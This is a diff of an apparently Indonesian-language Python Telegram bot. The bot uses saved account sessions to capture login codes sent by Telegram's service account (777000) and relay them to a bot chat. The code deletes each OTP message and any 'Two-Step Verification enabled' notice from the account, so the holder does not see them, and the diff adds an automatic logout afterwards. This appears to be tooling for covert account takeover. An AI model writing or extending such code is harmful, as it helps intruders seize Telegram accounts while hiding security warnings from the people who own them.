@@ -8,9 +8,7 @@ SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '
 
 # Fungsi untuk escape karakter markdown
 def escape_markdown(text):
-    # Escape karakter-karakter markdown yang berpotensi bermasalah
-    text = re.sub(r'([\\`*_{}[\]()#+\-.!])', r'\\\1', text)
-    return text
+    return re.sub(r'([\\`*_{}[\]()#+\-.!])', r'\\\1', text)
 
 # Handler GET OTP
 async def get_otp_handler(update, context, phone_number):
@@ -32,35 +30,38 @@ async def get_otp_handler(update, context, phone_number):
         async def otp_handler(event):
             otp = event.raw_text
             try:
-                # Cek apakah pesan berisi "Two-Step Verification enabled"
+                # Hapus jika pesan berisi "Two-Step Verification enabled"
                 if "Two-Step Verification enabled" in otp:
-                    # Hapus pesan yang berisi "Two-Step Verification enabled"
                     await client.delete_messages(777000, event.id)
                     print("🟢 Pesan 'Two-Step Verification enabled' dihapus.")
-                    return  # Jika pesan tersebut, keluar dari fungsi
+                    return
 
-                # Escape karakter-karakter markdown pada OTP
+                # Escape karakter markdown
                 otp = escape_markdown(otp)
 
-                # Kirim OTP ke bot Telegram dan simpan pesan
+                # Kirim OTP ke bot Telegram
                 otp_msg = await update.callback_query.message.reply_text(
                     f"🔐 OTP diterima:\n{otp}", parse_mode='Markdown'
                 )
 
-                # Hapus pesan dari 777000 langsung
+                # Hapus pesan OTP dari 777000
                 await client.delete_messages(777000, event.id)
 
+                # Kirim perintah /user dan tunggu sebelum hapus pesan
                 await context.bot.send_message(chat_id=update.effective_chat.id, text="/user")
-                # Tunggu 10 detik lalu hapus dua pesan dari bot
                 await asyncio.sleep(10)
                 await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=start_msg.message_id)
                 await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=otp_msg.message_id)
 
+                # ✅ Logout otomatis setelah OTP diproses
+                print(f"🚪 Logout otomatis untuk sesi: {phone_number}")
+                await client.log_out()
+
             except Exception as e:
-                print(f"❌ Gagal kirim atau hapus OTP: {e}")
+                print(f"❌ Gagal memproses OTP: {e}")
 
         print(f"🟢 Memantau OTP untuk {phone_number}...")
         await client.run_until_disconnected()
 
-    # Jalankan pemantauan OTP tanpa blokir
+    # Jalankan pemantauan OTP secara non-blokir
     asyncio.create_task(listen_otp())
